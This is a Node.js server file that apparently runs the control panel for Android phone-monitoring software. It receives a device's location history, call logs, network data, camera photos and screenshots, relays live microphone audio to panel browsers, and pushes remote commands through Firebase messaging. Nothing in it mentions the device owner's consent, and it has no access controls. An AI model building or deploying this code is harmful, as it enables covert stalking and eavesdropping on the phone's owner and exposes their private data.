require('dotenv').config();
const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const { WebSocketServer } = require('ws');

const app = express();
const server = http.createServer(app);

// ── Storage ──────────────────────────────────────────────────────────────────
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);

let state = {
  fcmToken: null,
  lastGeo: null,
  geoHistory: [],
  lastNetwork: null,
  calls: [],
  lastPong: null,
  lastPhotoFile: null,
  lastScreenFile: null,
  connectedAt: null,
};

const stateFile = path.join(DATA_DIR, 'state.json');
try { Object.assign(state, JSON.parse(fs.readFileSync(stateFile, 'utf8'))); } catch (_) {}

function save() {
  const s = { ...state };
  delete s.lastPhotoFile;
  delete s.lastScreenFile;
  try { fs.writeFileSync(stateFile, JSON.stringify(s)); } catch (_) {}
}

// ── Firebase Admin ────────────────────────────────────────────────────────────
let firebaseReady = false;
const saPath = path.join(__dirname, 'serviceAccount.json');
if (fs.existsSync(saPath)) {
  try {
    const admin = require('firebase-admin');
    admin.initializeApp({ credential: admin.credential.cert(require(saPath)) });
    firebaseReady = true;
    console.log('[FCM] Firebase Admin ready');
    module.exports._admin = admin;
  } catch (e) {
    console.error('[FCM] init failed:', e.message);
  }
} else {
  console.warn('[FCM] serviceAccount.json not found — commands disabled');
}

async function sendFcm(cmd) {
  if (!firebaseReady || !state.fcmToken) return false;
  try {
    const admin = require('firebase-admin');
    await admin.messaging().send({ token: state.fcmToken, data: { cmd } });
    return true;
  } catch (e) {
    console.error('[FCM]', e.message);
    return false;
  }
}

// ── Middleware ────────────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, 'public')));
app.use('/data', express.static(DATA_DIR));
app.use(express.json());

// Raw body for binary uploads (photo/screenshot)
app.use('/api/photo',      express.raw({ type: '*/*', limit: '20mb' }));
app.use('/api/screenshot', express.raw({ type: '*/*', limit: '20mb' }));

// ── REST API ──────────────────────────────────────────────────────────────────
app.get('/api/ping', (_req, res) => res.json({ ok: true }));

app.post('/api/register', (req, res) => {
  state.fcmToken = req.body.fcm_token;
  state.connectedAt = Date.now();
  save();
  broadcast({ type: 'device_online' });
  console.log('[REG] token saved');
  res.json({ ok: true });
});

app.post('/api/geo', (req, res) => {
  state.lastGeo = req.body;
  state.geoHistory.push(req.body);
  if (state.geoHistory.length > 2000) state.geoHistory.shift();
  save();
  broadcast({ type: 'geo', data: req.body });
  res.json({ ok: true });
});

app.post('/api/calls', (req, res) => {
  state.calls = req.body.calls || [];
  save();
  broadcast({ type: 'calls', data: state.calls });
  res.json({ ok: true });
});

app.post('/api/network', (req, res) => {
  state.lastNetwork = req.body;
  save();
  broadcast({ type: 'network', data: req.body });
  res.json({ ok: true });
});

app.post('/api/pong', (req, res) => {
  state.lastPong = req.body.ts || Date.now();
  save();
  broadcast({ type: 'pong', ts: state.lastPong });
  res.json({ ok: true });
});

app.post('/api/photo', (req, res) => {
  const facing = req.query.facing || 'back';
  const filename = `photo_${facing}_${Date.now()}.jpg`;
  fs.writeFileSync(path.join(DATA_DIR, filename), req.body);
  state.lastPhotoFile = filename;
  broadcast({ type: 'photo', facing, filename });
  console.log('[PHOTO]', filename);
  res.json({ ok: true });
});

app.post('/api/screenshot', (req, res) => {
  const filename = `screen_${Date.now()}.jpg`;
  fs.writeFileSync(path.join(DATA_DIR, filename), req.body);
  state.lastScreenFile = filename;
  broadcast({ type: 'screenshot', filename });
  console.log('[SCREEN]', filename);
  res.json({ ok: true });
});

// Panel sends commands here
app.post('/api/cmd', async (req, res) => {
  const { cmd } = req.body;
  const ok = await sendFcm(cmd);
  res.json({ ok });
});

// Full state snapshot for panel on load
app.get('/api/state', (_req, res) => {
  res.json({
    online:      !!state.fcmToken,
    connectedAt: state.connectedAt,
    lastGeo:     state.lastGeo,
    geoHistory:  state.geoHistory.slice(-500),
    lastNetwork: state.lastNetwork,
    calls:       state.calls,
    lastPong:    state.lastPong,
    lastPhoto:   state.lastPhotoFile,
    lastScreen:  state.lastScreenFile,
    fcmReady:    firebaseReady,
  });
});

// ── WebSocket ─────────────────────────────────────────────────────────────────
// /ws/events  — panel browsers (JSON)
// /ws/audio   — Android device audio stream
// /ws/listen  — panel browser audio listener

const panelWss = new WebSocketServer({ server, path: '/ws/events' });
const audioWss = new WebSocketServer({ server, path: '/ws/audio' });
const listenWss = new WebSocketServer({ server, path: '/ws/listen' });

const panelClients = new Set();
const listenClients = new Set();
let deviceAudioWs = null;

panelWss.on('connection', ws => {
  panelClients.add(ws);
  ws.on('close', () => panelClients.delete(ws));
  ws.on('error', () => panelClients.delete(ws));
  ws.on('message', async data => {
    try {
      const msg = JSON.parse(data.toString());
      if (msg.type === 'cmd') {
        const ok = await sendFcm(msg.cmd);
        ws.send(JSON.stringify({ type: 'cmd_ack', cmd: msg.cmd, ok }));
      } else if (msg.type === 'audio_ctl') {
        // Forward start/stop to device audio WS
        if (deviceAudioWs && deviceAudioWs.readyState === 1) {
          deviceAudioWs.send(msg.cmd);
        }
      }
    } catch (_) {}
  });
});

// Android device audio WebSocket
audioWss.on('connection', ws => {
  console.log('[AUDIO] device connected');
  deviceAudioWs = ws;
  broadcast({ type: 'audio_device', online: true });

  ws.on('message', data => {
    // PCM binary from device → relay to all listen clients
    if (Buffer.isBuffer(data)) {
      listenClients.forEach(c => {
        if (c.readyState === 1) c.send(data);
      });
    }
  });

  ws.on('close', () => {
    deviceAudioWs = null;
    broadcast({ type: 'audio_device', online: false });
    console.log('[AUDIO] device disconnected');
  });

  ws.on('error', () => {
    deviceAudioWs = null;
  });
});

// Panel browser listens to audio stream
listenWss.on('connection', ws => {
  listenClients.add(ws);
  ws.on('close', () => listenClients.delete(ws));
  ws.on('error', () => listenClients.delete(ws));
});

function broadcast(obj) {
  const msg = JSON.stringify(obj);
  panelClients.forEach(ws => {
    if (ws.readyState === 1) ws.send(msg);
  });
}

// ── Start ─────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`[PANEL] http://0.0.0.0:${PORT}`);
});
